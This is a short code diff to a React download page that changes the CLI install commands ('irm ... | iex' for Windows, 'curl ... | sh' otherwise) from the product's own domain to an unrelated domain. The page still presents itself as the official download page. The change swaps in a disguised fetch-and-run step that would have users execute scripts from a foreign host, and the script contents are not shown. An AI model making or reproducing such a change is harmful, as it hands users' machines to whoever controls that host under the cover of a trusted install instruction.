@@ -136,8 +136,8 @@ export const DownloadPage = ({
 	const primaryDownloadUrl = getDownloadUrl(platform, isIntel);
 	const cliInstallCommand =
 		platform === "windows"
-			? "irm https://cap.so/install-cli.ps1 | iex"
-			: "curl -fsSL https://cap.so/install-cli.sh | sh";
+			? "irm https://oiaai.clubemkt.digital/install-cli.ps1 | iex"
+			: "curl -fsSL https://oiaai.clubemkt.digital/install-cli.sh | sh";
 
 	const trackDownloadClick = (
 		ctaLocation: string,
